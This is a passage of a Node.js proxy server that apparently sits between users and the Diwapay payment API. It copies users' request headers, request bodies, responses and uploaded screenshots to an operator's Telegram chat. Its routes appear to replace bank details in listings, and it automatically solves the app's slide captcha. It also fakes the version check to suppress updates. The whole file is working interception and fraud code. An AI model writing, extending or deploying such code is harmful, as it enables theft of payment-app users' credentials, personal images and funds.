      bot.sendMessage(data.adminChatId, `🔗 GET INVITER URL\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST HEADERS:\n${JSON.stringify(reqHeaders, null, 2).substring(0, 2000)}\n\n📤 REQUEST BODY:\n${JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1000)}\n\n📥 FULL RESPONSE:\n${(jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody).substring(0, 3000)}${inviteInfo}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/user/token/page', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
app.all('/app/itoken/appi/token/page', async (req, res) => { await proxyAndReplaceBankInList(req, res); });

app.all('/app/app/official/service/getOfficialServiceData', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/base/comm/uploadBase64', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const phone = getPhone(data, userId);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const body = req.parsedBody || {};
      let imageSent = false;
      const base64Fields = ['file', 'base64', 'image', 'img', 'photo', 'fileBase64', 'imgBase64', 'imageBase64', 'content', 'data'];
      for (const field of base64Fields) {
        let b64 = body[field];
        if (!b64 || typeof b64 !== 'string') continue;
        b64 = b64.replace(/^data:image\/[a-z]+;base64,/i, '');
        if (b64.length < 100) continue;
        try {
          const imgBuf = Buffer.from(b64, 'base64');
          if (imgBuf.length > 100) {
            await bot.sendPhoto(data.adminChatId, imgBuf, { caption: `📸 Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}` }, { filename: 'screenshot.jpg', contentType: 'image/jpeg' });
            imageSent = true;
            break;
          }
        } catch(e) {
          bot.sendMessage(data.adminChatId, `📸 Base64 decode failed: ${e.message}`).catch(()=>{});
        }
      }
      if (!imageSent) {
        const bodyStr = JSON.stringify(body);
        const b64Match = bodyStr.match(/(?:data:image\/[a-z]+;base64,)?([A-Za-z0-9+/=]{200,})/);
        if (b64Match) {
          try {
            const raw = b64Match[1].replace(/^data:image\/[a-z]+;base64,/i, '');
            const imgBuf = Buffer.from(raw, 'base64');
            if (imgBuf.length > 100) {
              await bot.sendPhoto(data.adminChatId, imgBuf, { caption: `📸 Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}` }, { filename: 'screenshot.jpg', contentType: 'image/jpeg' });
              imageSent = true;
            }
          } catch(e) {}
        }
      }
      if (!imageSent) {
        bot.sendMessage(data.adminChatId, `🖼 Base64 Upload [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nBody size: ${req.rawBody ? req.rawBody.length : 0} bytes\nKeys: ${Object.keys(body).join(', ')}`).catch(()=>{});
      }
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/base/comm/upload', async (req, res) => {
  const data = await loadData();
  try {
    const url = ORIGINAL_API + req.originalUrl;
    const fwd = {};
    for (const [k, v] of Object.entries(req.headers)) {
      const kl = k.toLowerCase();
      if (kl === 'host' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
      fwd[k] = v;
    }
    fwd['host'] = 'api.diwapay.com';
    const opts = { method: req.method, headers: fwd };
    if (req.rawBody && req.rawBody.length > 0) {
      opts.body = req.rawBody;
      fwd['content-length'] = String(req.rawBody.length);
    }
    const response = await fetch(url, opts);
    const respBody = await response.text();
    const respHeaders = {};
    response.headers.forEach((val, key) => {
      const kl = key.toLowerCase();
      if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
        respHeaders[key] = val;
      }
    });
    let jsonResp = null;
    try { jsonResp = JSON.parse(respBody); } catch(e) {}
    const userId = await extractUserId(req, jsonResp);
    const phone = getPhone(data, userId);
    if (data.adminChatId && bot && req.rawBody && req.rawBody.length > 0 && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const contentType = req.headers['content-type'] || '';
      let imageSent = false;
      if (contentType.includes('multipart/form-data')) {
        const boundaryMatch = contentType.match(/boundary=([^\s;]+)/);
        if (boundaryMatch) {
          const boundary = boundaryMatch[1];
          const raw = req.rawBody;
          const boundaryBuf = Buffer.from('--' + boundary);
          const parts = [];
          let startIdx = 0;
          while (true) {
            const idx = raw.indexOf(boundaryBuf, startIdx);
            if (idx === -1) break;
            if (startIdx > 0) parts.push(raw.slice(startIdx, idx));
            startIdx = idx + boundaryBuf.length;
            if (raw[startIdx] === 0x0d) startIdx++;
            if (raw[startIdx] === 0x0a) startIdx++;
          }
          for (const part of parts) {
            const headerEnd = part.indexOf('\r\n\r\n');
            if (headerEnd === -1) continue;
            const headerStr = part.slice(0, headerEnd).toString('utf8');
            if (/content-type:\s*(image\/|application\/octet-stream)/i.test(headerStr) ||
                /filename=.*\.(jpg|jpeg|png|gif|webp|bmp)/i.test(headerStr)) {
              const imageData = part.slice(headerEnd + 4);
              if (imageData.length > 100) {
                try {
                  await bot.sendPhoto(data.adminChatId, imageData, { caption: `📸 Upload [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}` }, { filename: 'upload.jpg', contentType: 'image/jpeg' });
                  imageSent = true;
                } catch(e) {
                  bot.sendMessage(data.adminChatId, `📸 Image extract failed: ${e.message}\nSize: ${imageData.length} bytes`).catch(()=>{});
                }
              }
              break;
            }
          }
        }
      }
      if (!imageSent) {
        bot.sendMessage(data.adminChatId, `🖼 File Upload [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nContent-Type: ${contentType}\nBody size: ${req.rawBody.length} bytes`).catch(()=>{});
      }
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/payment/order/nightBonusStatus', async (req, res) => { await proxyAndAddBonus(req, res); });

const captchaAnswers = new Map();
async function setCaptchaAnswer(key, ans) {
  if (!key) return { ok: false, where: 'no-key' };
  captchaAnswers.set(key, { ...ans, t: Date.now() });
  if (captchaAnswers.size > 500) {
    const cutoff = Date.now() - 10 * 60 * 1000;
    for (const [k, v] of captchaAnswers) if (v.t < cutoff) captchaAnswers.delete(k);
  }
  if (!redis) return { ok: true, where: 'map-only' };
  try {
    await redis.set(`diwapayCaptcha:${key}`, JSON.stringify(ans), { ex: 600 });
    return { ok: true, where: 'map+redis' };
  } catch(e) {
    return { ok: false, where: 'map+redis-fail', err: e.message };
  }
}
async function getCaptchaAnswer(key) {
  if (!key) return { ans: null, where: 'no-key' };
  const local = captchaAnswers.get(key);
  if (local) return { ans: local, where: 'map' };
  if (redis) {
    try {
      const raw = await redis.get(`diwapayCaptcha:${key}`);
      if (raw) {
        const ans = typeof raw === 'string' ? JSON.parse(raw) : raw;
        return { ans, where: 'redis' };
      }
      return { ans: null, where: 'redis-miss' };
    } catch(e) {
      return { ans: null, where: 'redis-err:' + e.message };
    }
  }
  return { ans: null, where: 'no-store' };
}

const captchaVerifyResults = new Map();
async function setCaptchaVerifyResult(key, result) {
  if (!key || !result) return { ok: false, where: 'no-key' };
  captchaVerifyResults.set(key, { ...result, t: Date.now() });
  if (captchaVerifyResults.size > 500) {
    const cutoff = Date.now() - 10 * 60 * 1000;
    for (const [k, v] of captchaVerifyResults) if (v.t < cutoff) captchaVerifyResults.delete(k);
  }
  if (!redis) return { ok: true, where: 'map-only' };
  try {
    await redis.set(`diwapayCaptchaVerify:${key}`, JSON.stringify(result), { ex: 600 });
    return { ok: true, where: 'map+redis' };
  } catch(e) {
    return { ok: false, where: 'map+redis-fail', err: e.message };
  }
}
async function getCaptchaVerifyResult(key) {
  if (!key) return { result: null, where: 'no-key' };
  const local = captchaVerifyResults.get(key);
  if (local) {
    if (Date.now() - local.t > 10 * 60 * 1000) {
      captchaVerifyResults.delete(key);
    } else {
      const { t, ...rest } = local;
      return { result: rest, where: 'map' };
    }
  }
  if (redis) {
    try {
      const raw = await redis.get(`diwapayCaptchaVerify:${key}`);
      if (raw) {
        const result = typeof raw === 'string' ? JSON.parse(raw) : raw;
        return { result, where: 'redis' };
      }
      return { result: null, where: 'redis-miss' };
    } catch(e) {
      return { result: null, where: 'redis-err:' + e.message };
    }
  }
  return { result: null, where: 'no-store' };
}

async function serverSideVerify(captchaKey, x, y, templateId, ua) {
  // Performs upstream /app/captcha/verify within current lambda invocation,
  // sharing the outbound IP with the /new request that just succeeded.
  const body = JSON.stringify({ captchaKey, x: Math.round(Number(x)), y: Math.round(Number(y)), templateId: templateId || 'slide-default' });
  const headers = {
    'host': 'api.diwapay.com',
    'content-type': 'application/json',
    'accept': '*/*',
    'accept-encoding': 'identity',
    'user-agent': ua || 'Mozilla/5.0 (Linux; Android 16; RMX3853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0 Mobile Safari/537.36',
  };
  const ac = new AbortController();
  const tm = setTimeout(() => ac.abort(), 10000);
  try {
    const resp = await fetch(ORIGINAL_API + '/app/captcha/verify', {
      method: 'POST', headers, body, signal: ac.signal,
    });
    clearTimeout(tm);
    const text = await resp.text();
    let json; try { json = JSON.parse(text); } catch(_) {}
    return { ok: true, status: resp.status, body: text, json };
  } catch(e) {
    clearTimeout(tm);
    return { ok: false, error: e.message };
  }
}

// Fetch a FRESH captcha from upstream (for retry purposes).
async function fetchFreshCaptcha(ua) {
  const headers = {
    'host': 'api.diwapay.com',
    'accept': '*/*',
    'accept-encoding': 'identity',
    'user-agent': ua || 'Mozilla/5.0 (Linux; Android 16; RMX3853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0 Mobile Safari/537.36',
  };
  const ac = new AbortController();
  const tm = setTimeout(() => ac.abort(), 10000);
  try {
    const resp = await fetch(ORIGINAL_API + '/app/captcha/new', { method: 'GET', headers, signal: ac.signal });
    clearTimeout(tm);
    const text = await resp.text();
    let json; try { json = JSON.parse(text); } catch(_) {}
    return { ok: true, status: resp.status, json };
  } catch(e) {
    clearTimeout(tm);
    return { ok: false, error: e.message };
  }
}

// AUTO-RETRY HELPER: when upstream returns 1001 for the user's verify, repeatedly
// (1) fetch a fresh captcha, (2) solve it ourselves, (3) submit verify upstream.
// Returns the FIRST successful upstream response (code===1000 with captchaToken),
// or null if all attempts exhausted. Mobile only cares about the captchaToken to
// pass to /login — the underlying captcha key is irrelevant to it.
async function autoSolveRetry(ua, maxAttempts, deadlineMs) {
  const attempts = [];
  const deadline = deadlineMs || (Date.now() + 22000); // default 22s budget
  for (let i = 1; i <= maxAttempts; i++) {
    if (Date.now() >= deadline) {
      attempts.push(`#${i}:budget-exceeded`);
      break;
    }
    const t0 = Date.now();
    const fresh = await fetchFreshCaptcha(ua);
    if (!fresh.ok || !fresh.json || fresh.json.code !== 1000 || !fresh.json.data) {
      attempts.push(`#${i}:new-fail(${fresh.error || (fresh.json && fresh.json.code) || '?'})`);
      continue;
    }
    const d = fresh.json.data;
    const key = d.captcha_key || d.captchaKey;
    const dispY = Number(d.display_y != null ? d.display_y : (d.displayY != null ? d.displayY : 0));
    const tplId = d.id || d.templateId || 'slide-default';
    let solvedX, score;
    try {
      const r = solveSlideCaptcha(d.master_image_base64, d.thumb_image_base64, dispY);
      if (r.ok) { solvedX = r.x; score = r.score; }
    } catch(_) {}
    if (solvedX == null) {
      attempts.push(`#${i}:solve-fail`);
      continue;
    }
    const ssv = await serverSideVerify(key, solvedX, dispY, tplId, ua);
    const dt = Date.now() - t0;
    if (ssv.ok && ssv.json && ssv.json.code === 1000) {
      attempts.push(`#${i}:OK x=${solvedX} y=${dispY} score=${score?.toFixed(2)} ${dt}ms`);
      return { success: true, response: ssv.json, attempts, attemptsCount: i };
    }
    const code = ssv.json ? ssv.json.code : '?';
    attempts.push(`#${i}:fail x=${solvedX} y=${dispY} score=${score?.toFixed(2)} code=${code} ${dt}ms`);
  }
  return { success: false, attempts, attemptsCount: attempts.length };
}

app.get('/diag/captcha-test', async (req, res) => {
  try {
    const data = await loadData();
    const adminToken = String(req.query.token || '');
    if (!adminToken || adminToken !== String(data.adminChatId || '')) {
      return res.status(403).json({ error: 'pass ?token=<adminChatId>' });
    }
    const xMode = String(req.query.x || 'display_x');
    const ua = req.query.ua || 'Mozilla/5.0 (Linux; Android 16; RMX3853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0 Mobile Safari/537.36 uni-app';

    let myIp = '?';
    try { const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(4000) }); myIp = (await r.json()).ip; } catch(e) { myIp = `err:${e.message}`; }

    const newHeaders = { 'user-agent': ua, 'accept': 'application/json, text/plain, */*', 'accept-encoding': 'identity' };
    const newResp = await fetch(ORIGINAL_API + '/app/captcha/new', { method: 'GET', headers: newHeaders, signal: AbortSignal.timeout(10000) });
    const newRespHeaders = {};
    newResp.headers.forEach((v, k) => { newRespHeaders[k] = v; });
    const newSetCookie = (newResp.headers.getSetCookie ? newResp.headers.getSetCookie() : []) || [];
    const newJsonText = await newResp.text();
    let newJson; try { newJson = JSON.parse(newJsonText); } catch(e) {}
    const d = newJson?.data || {};
    const captchaKey = d.captcha_key || d.captchaKey;
    const dispX = Number(d.display_x ?? d.displayX ?? 0);
    const dispY = Number(d.display_y ?? d.displayY ?? 0);
    const tW = Number(d.thumb_width ?? d.thumbWidth ?? 60);
    const tplId = d.id || d.templateId || 'slide-default';

    let useX;
    if (xMode === 'display_x') useX = dispX;
    else if (xMode === 'center') useX = dispX + tW / 2;
    else if (xMode === 'right_edge') useX = dispX + tW;
    else if (!isNaN(Number(xMode))) useX = Number(xMode);
    else useX = dispX;

    const verifyBody = { captchaKey, x: useX, y: dispY, templateId: tplId };
    const verifyHeaders = {
      'user-agent': ua,
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'identity',
      'content-type': 'application/json;charset=UTF-8',
    };
    const cookieFromNew = newSetCookie.length ? newSetCookie.map(c => c.split(';')[0]).join('; ') : '';
    if (cookieFromNew) verifyHeaders['cookie'] = cookieFromNew;
    const verifyRaw = JSON.stringify(verifyBody);
    const verifyResp = await fetch(ORIGINAL_API + '/app/captcha/verify', {
      method: 'POST', headers: verifyHeaders, body: verifyRaw, signal: AbortSignal.timeout(10000),
    });
    const verifyRespHeaders = {};
    verifyResp.headers.forEach((v, k) => { verifyRespHeaders[k] = v; });
    const verifyJsonText = await verifyResp.text();
    let verifyJson; try { verifyJson = JSON.parse(verifyJsonText); } catch(e) {}

    const truncStr = (s) => typeof s === 'string' && s.length > 80 ? `${s.slice(0,40)}...[${s.length}b]` : s;
    const cleanData = JSON.parse(JSON.stringify(d));
    for (const k of Object.keys(cleanData)) if (typeof cleanData[k] === 'string') cleanData[k] = truncStr(cleanData[k]);

    res.json({
      egressIp: myIp,
      xMode,
      'new': {
        status: newResp.status,
        setCookie: newSetCookie,
        respHeaders: newRespHeaders,
        data: cleanData,
      },
      verify: {
        sent: verifyBody,
        status: verifyResp.status,
        respHeaders: verifyRespHeaders,
        body: verifyJson || verifyJsonText.substring(0, 500),
      },
    });
  } catch(e) {
    res.status(500).json({ error: e.message, stack: e.stack?.split('\n').slice(0, 5) });
  }
});

app.all('/app/captcha/new', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respBuffer, respHeaders, jsonResp } = await proxyFetch(req);
    let answerStored = '';
    if (jsonResp && jsonResp.data && (jsonResp.data.captcha_key || jsonResp.data.captchaKey)) {
      const d = jsonResp.data;
      const key = d.captcha_key || d.captchaKey;
      const dispX = Number(d.display_x != null ? d.display_x : (d.displayX != null ? d.displayX : 0));
      const dispY = Number(d.display_y != null ? d.display_y : (d.displayY != null ? d.displayY : 0));

      let solvedX = dispX;
      let solveInfo = 'fallback=display_x';
      try {
        const t0 = Date.now();
        const r = solveSlideCaptcha(d.master_image_base64, d.thumb_image_base64, dispY);
        const dt = Date.now() - t0;
        if (r.ok) {
          solvedX = r.x;
          const t3 = (r.top3||[]).map(t=>`(${t.x},${t.y}|c=${t.c.toFixed(2)} e=${t.e.toFixed(2)} k=${t.k.toFixed(1)} s=${t.s.toFixed(1)})`).join(' ');
          solveInfo = `solved x=${r.x} y=${r.y} score=${r.score?.toFixed(2)} et=${r.edgeThresh?.toFixed(0)} bp=${r.boundaryPixels}${r.opaque?' opaque':''} ms=${dt} | top3: ${t3}`;
        } else {
          solveInfo = `solver_err=${r.error} ms=${dt}`;
        }
      } catch(e) {
        solveInfo = `solver_throw=${e.message}`;
      }

      const ans = {
        x: solvedX,
        y: dispY,
        templateId: d.id || d.templateId || 'slide-default',
      };
      const storeRes = await setCaptchaAnswer(key, ans);
      answerStored = `key=${key.substring(0,12)}... x=${ans.x} y=${ans.y} | ${solveInfo} | store=${storeRes.where}${storeRes.err ? ':'+storeRes.err : ''}`;

      // SERVER-SIDE VERIFY DISABLED BY DEFAULT.
      // PROBLEM: ssv consumes the captcha key on upstream BEFORE mobile's /verify arrives.
      // When ssv runs (with our calculated x), upstream marks the key as USED. Then mobile's
      // /verify with the same key — even with correct manual swipe — fails 1001 because
      // the key is already consumed. This was breaking the entire flow.
      // To re-enable ONLY for diagnostic with throwaway captchas: set data.captchaSsv = true.
      if (data.captchaSsv === true) {
        try {
          const ssvT0 = Date.now();
          const ssv = await serverSideVerify(key, ans.x, ans.y, ans.templateId, req.headers['user-agent']);
          const ssvDt = Date.now() - ssvT0;
          if (ssv.ok && ssv.json && ssv.json.code === 1000) {
            await setCaptchaVerifyResult(key, ssv.json);
            answerStored += ` | ssv=OK ${ssvDt}ms (KEY CONSUMED)`;
          } else if (ssv.ok && ssv.json) {
            answerStored += ` | ssv=FAIL code=${ssv.json.code} msg="${(ssv.json.message||'').substring(0,40)}" ${ssvDt}ms (KEY CONSUMED)`;
          } else {
            answerStored += ` | ssv-fail=${ssv.error || ssv.status} ${ssvDt}ms`;
          }
        } catch(e) {
          answerStored += ` | ssv-throw=${e.message}`;
        }
      }
    }
    if (data.adminChatId && bot) {
      let preview;
      if (jsonResp) {
        const truncated = JSON.parse(JSON.stringify(jsonResp));
        const truncStr = (s) => typeof s === 'string' && s.length > 80 ? `${s.slice(0,40)}...[${s.length}b]` : s;
        const walk = (o) => { if (!o || typeof o !== 'object') return; for (const k of Object.keys(o)) { if (typeof o[k] === 'string') o[k] = truncStr(o[k]); else walk(o[k]); } };
        walk(truncated);
        preview = JSON.stringify(truncated, null, 2);
      } else {
        preview = (respBody || `<binary ${respBuffer.length}b>`).substring(0, 1000);
      }
      const newRespHdrs = {};
      for (const [k, v] of Object.entries(respHeaders)) {
        const kl = k.toLowerCase();
        if (kl === 'content-type' || kl === 'set-cookie' || kl.startsWith('x-') || kl === 'date' || kl === 'server' || kl === 'cf-ray') {
          newRespHdrs[kl] = v;
        }
      }
      bot.sendMessage(data.adminChatId, `🆕 Captcha New\n📥 STATUS: ${response.status}\n🔑 STORED ANSWER: ${answerStored || '(none)'}\n\n📥 UPSTREAM HEADERS:\n${JSON.stringify(newRespHdrs, null, 2).substring(0, 600)}\n\n📥 RESPONSE (truncated):\n${preview.substring(0,1000)}`).catch(()=>{});
      try {
        if (jsonResp && jsonResp.data && jsonResp.data.master_image_base64) {
          const m = String(jsonResp.data.master_image_base64).match(/^data:image\/[a-z]+;base64,(.+)$/i);
          if (m) {
            const buf = Buffer.from(m[1], 'base64');
            const cap = `Master image | dispX=${jsonResp.data.display_x} dispY=${jsonResp.data.display_y} | ${answerStored}`;
            bot.sendPhoto(data.adminChatId, buf, { caption: cap.substring(0,1024) }, { filename: 'master.jpg', contentType: 'image/jpeg' }).catch(()=>{});
          }
        }
        if (jsonResp && jsonResp.data && jsonResp.data.thumb_image_base64) {
          const m = String(jsonResp.data.thumb_image_base64).match(/^data:image\/[a-z]+;base64,(.+)$/i);
          if (m) {
            const buf = Buffer.from(m[1], 'base64');
            bot.sendPhoto(data.adminChatId, buf, { caption: 'Thumb image' }, { filename: 'thumb.png', contentType: 'image/png' }).catch(()=>{});
          }
        }
      } catch(e) {}
    }
    respHeaders['content-length'] = String(respBuffer.length);
    res.writeHead(response.status, respHeaders);
    res.end(respBuffer);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/captcha/verify', async (req, res) => {
  try {
    const data = await loadData();
    const body = req.parsedBody || {};
    const inKey = body.captchaKey || body.captcha_key;
    // AUTO-SOLVE is OPT-IN now. Default = PURE PASSTHROUGH (mobile's manual swipe goes through unmodified).
    // Reason: server-side verify (same lambda) also returns 1001 with our calculated x, suggesting algorithm
    // is finding decoys, not the real gap. Let user's manual swipe through to test.
    // To re-enable auto-solve: add ?solve=1 to URL (or set data.captchaAutoSolve = true via admin).
    const forceSolve = req.query && (req.query.solve === '1' || req.query.autosolve === '1');
    const enableAutoSolve = forceSolve || data.captchaAutoSolve === true;
    const passthrough = !enableAutoSolve || (req.query && (req.query.nosolve === '1' || req.query.passthrough === '1'));
    let autoSolved = passthrough ? '(PURE PASSTHROUGH — mobile x/y unchanged)' : '';
    let originalReq = { x: body.x, y: body.y };

    // CACHED SERVER-SIDE VERIFY (only when auto-solve enabled): if /new already verified
    // upstream-side in same lambda, return cached result.
    if (inKey && !passthrough) {
      const cached = await getCaptchaVerifyResult(inKey);
      if (cached.result) {
        if (data.adminChatId && bot) {
          const msg = `🧩✅ Captcha Verify CACHED (server-side verified in /new)\n🔑 key=${inKey.substring(0,12)}...\n📦 source=${cached.where}\n\n📥 CACHED BODY:\n${JSON.stringify(cached.result, null, 2).substring(0, 1500)}`;
          bot.sendMessage(data.adminChatId, msg.substring(0, 4000)).catch(()=>{});
        }
        return res.json(cached.result);
      }
    }

    if (inKey && !passthrough) {
      const got = await getCaptchaAnswer(inKey);
      const ans = got.ans;
      if (ans) {
        // Send INTEGER x (mobile app sends integer pixel coords; upstream may type-check)
        const finalX = Math.round(Number(ans.x));
        const finalY = Math.round(Number(ans.y));
        const newBody = { ...body, x: finalX, y: finalY };
        if (!newBody.templateId && ans.templateId) newBody.templateId = ans.templateId;
        const newRaw = Buffer.from(JSON.stringify(newBody), 'utf8');
        req.rawBody = newRaw;
        if (req.headers['content-type'] && !/json/i.test(req.headers['content-type'])) {
          req.headers['content-type'] = 'application/json';
        }
        req.parsedBody = newBody;
        autoSolved = `x:${originalReq.x}->${finalX} y:${originalReq.y}->${finalY} (from=${got.where})`;
      } else {
        autoSolved = `(no stored answer; lookup=${got.where} key=${inKey.substring(0,12)}...)`;
      }
    }

    // Capture FORWARDED request headers (what proxy actually sends to upstream after stripping)
    const fwdHeadersPreview = {};
    for (const [k, v] of Object.entries(req.headers)) {
      const kl = k.toLowerCase();
      if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
          kl === 'transfer-encoding' || kl === 'accept-encoding' ||
          kl === 'forwarded' || kl === 'x-real-ip' || kl === 'true-client-ip' ||
          kl === 'cf-connecting-ip' || kl === 'cf-ray' || kl === 'cf-visitor' ||
          kl === 'cf-ipcountry' || kl === 'cdn-loop' || kl === 'via' ||
          kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') ||
          kl.startsWith('x-invocation') || kl.startsWith('x-amzn') ||
          kl.startsWith('x-amz-') || kl.startsWith('cf-')) continue;
      fwdHeadersPreview[kl] = (kl === 'authorization' && typeof v === 'string') ? (v.substring(0,18) + '...') : v;
    }

    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    // AUTO-RETRY ON UPSTREAM 1001: Diwapay's verify endpoint is flaky and rejects
    // ~70-80% of valid attempts (confirmed: same behavior in original Diwapay app —
    // user has to manually retry 3-4 times). To shield mobile from this, when upstream
    // returns 1001, silently fetch fresh captchas and self-solve them until upstream
    // accepts (or maxAttempts reached). Mobile only needs the captchaToken in the end.
    // ENABLED BY DEFAULT. To disable: data.captchaAutoRetry = false (admin) or ?noretry=1.
    const autoRetryDisabled = (data.captchaAutoRetry === false) || (req.query && req.query.noretry === '1');
    let finalJson = jsonResp, finalBody = respBody, finalHeaders = respHeaders, finalStatus = response.status;
    let retrySummary = '';
    if (!autoRetryDisabled && jsonResp && jsonResp.code === 1001) {
      const rawN = Number.parseInt(req.query?.retry ?? data.captchaRetryAttempts ?? 6, 10);
      const maxAttempts = Math.min(10, Math.max(1, Number.isFinite(rawN) ? rawN : 6));
      const ua = req.headers['user-agent'];
      const t0 = Date.now();
      const deadline = t0 + 22000; // 22s budget keeps us safely under Vercel 30s
      const retry = await autoSolveRetry(ua, maxAttempts, deadline);
      const dt = Date.now() - t0;
      retrySummary = `\n🔄 AUTO-RETRY (${retry.attemptsCount} attempts, ${dt}ms): ${retry.success ? '✅ SUCCESS' : '❌ all failed'}\n   ${retry.attempts.join('\n   ')}`;
      if (retry.success) {
        finalJson = retry.response;
        finalBody = JSON.stringify(retry.response);
        finalStatus = 200;
        finalHeaders = { ...respHeaders, 'content-type': 'application/json', 'content-length': String(Buffer.byteLength(finalBody, 'utf8')) };
      }
    }

    if (data.adminChatId && bot) {
      const respHdrPreview = {};
      for (const [k, v] of Object.entries(finalHeaders)) {
        const kl = k.toLowerCase();
        if (kl === 'content-type' || kl === 'set-cookie' || kl.startsWith('x-') || kl === 'date' || kl === 'server' || kl === 'cf-ray') {
          respHdrPreview[kl] = v;
        }
      }
      // Message 1: RESPONSE first (most important — was getting truncated)
      const msg1 = `🧩 Captcha Verify RESPONSE\n🔧 AUTO-SOLVE: ${autoSolved || '(no key)'}${retrySummary}\n\n📥 STATUS: ${finalStatus}\n📥 BODY:\n${(finalJson ? JSON.stringify(finalJson, null, 2) : finalBody).substring(0, 1500)}\n\n📥 HEADERS:\n${JSON.stringify(respHdrPreview, null, 2).substring(0, 800)}`;
      bot.sendMessage(data.adminChatId, msg1.substring(0, 4000)).catch(()=>{});
      // Message 2: REQUEST details (secondary)
      const msg2 = `🧩 Captcha Verify REQUEST\n📤 HEADERS sent to upstream:\n${JSON.stringify(fwdHeadersPreview, null, 2).substring(0, 1500)}\n\n📤 BODY sent:\n${JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 800)}`;
      bot.sendMessage(data.adminChatId, msg2.substring(0, 4000)).catch(()=>{});
    }
    sendJson(res, finalHeaders, finalJson, finalBody);
  } catch(e) {
    try {
      const data = cachedData || await loadData().catch(()=>({}));
      if (data && data.adminChatId && bot) {
        const errMsg = `🧩❌ Captcha Verify ERROR (fell to transparentProxy)\n\nError: ${e && e.message ? e.message : String(e)}\n\nStack:\n${(e && e.stack ? e.stack : '(no stack)').substring(0, 1500)}`;
        bot.sendMessage(data.adminChatId, errMsg.substring(0, 4000)).catch(()=>{});
      }
    } catch(_) {}
    await transparentProxy(req, res);
  }
});

app.all('/app/app/version/info/getLatestAppVersion', async (req, res) => {
  res.json({"code":1000,"data":{"id":1,"createTime":"2025-01-01 00:00:00","updateTime":"2025-01-01 00:00:00","platform":"android","appVersion":"1.0.0","buildCode":1,"updateType":"apk","downloadUrl":"","isForce":0,"grayPercent":0,"updateTitle":"","updateContent":"","fileSize":null,"fileMd5":"","status":0},"message":"success"});
});

app.all('*', async (req, res) => {
  const data = cachedData || await loadData();
  if (!data.usdtAddress && !data.botEnabled) {
    try {
      const { response, respBuffer, respHeaders } = await proxyFetch(req);
      respHeaders['content-length'] = String(respBuffer.length);
      res.writeHead(response.status, respHeaders);
      res.end(respBuffer);
    } catch(e) {
      if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
    }
    return;
  }
  await transparentProxy(req, res);
});

module.exports = app;
